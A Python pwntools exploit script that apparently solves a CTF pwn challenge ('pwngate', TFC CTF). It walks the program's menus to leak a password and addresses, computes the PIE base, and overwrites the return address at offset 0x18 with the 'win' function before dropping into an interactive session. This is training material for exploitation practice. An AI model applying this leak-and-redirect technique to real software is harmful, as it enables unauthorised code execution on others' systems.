#!/usr/bin/env python3

from pwn import *

elf = ELF("./pwngate.elf")
# libc = ELF("./libc.so.6")
# g = ROP(libc)

# s  = remote("challs.tfcctf.com", 32470)
s = process(elf.path)

def main():

	s.sendlineafter(b'Enter your name: ', b'rinzler')
	
	s.sendlineafter(b'Enter choice: ', b'1')
	s.sendlineafter(b'Choose where to leap: ', b'\xec'*9)
	
	s.sendlineafter(b'Enter choice: ', b'2')
	s.sendlineafter(b'Choose what to do: ', b'12312309732999168')

	s.recvuntil(b'Your password is: \n')
	password = s.recvline(False)
	s.success(f"Password is: {password.decode()}")

	s.sendlineafter(b'Enter choice: ', b'3')
	s.sendlineafter(b'Choose: ', b'3')
	s.sendlineafter(b'Choose: ', b'2')
	
	s.recvuntil(b'These are your answers: \n')
	addr = [s.recvline(False) for i in range(3)]
	addr = [u64(a.ljust(8, b'\x00')) for a in addr]

	base = addr[0] - 0x3d48
	s.success(f"Base is: {hex(base)}")

	s.sendlineafter(b'Choose: ', b'1')
	[s.sendline(b'I didn\'t remember...') for _ in range(3)]
	s.sendlineafter(b'Is Ruka a boy or girl?\n', b'It depends on the timeline')
	
	s.sendlineafter(b'Choose: ', b'4')
	s.sendlineafter(b'Enter choice: ', b'4')
	s.sendlineafter(b'What\'s the password?\n', password)
	pl = flat({
		0x18:	p64(base + elf.sym.win)
	})
	s.sendlineafter(b'Do you still remember who you are?: ', pl)

	s.sendlineafter(b'Enter choice: ', b'2')
	s.interactive()


if __name__=="__main__":
	main()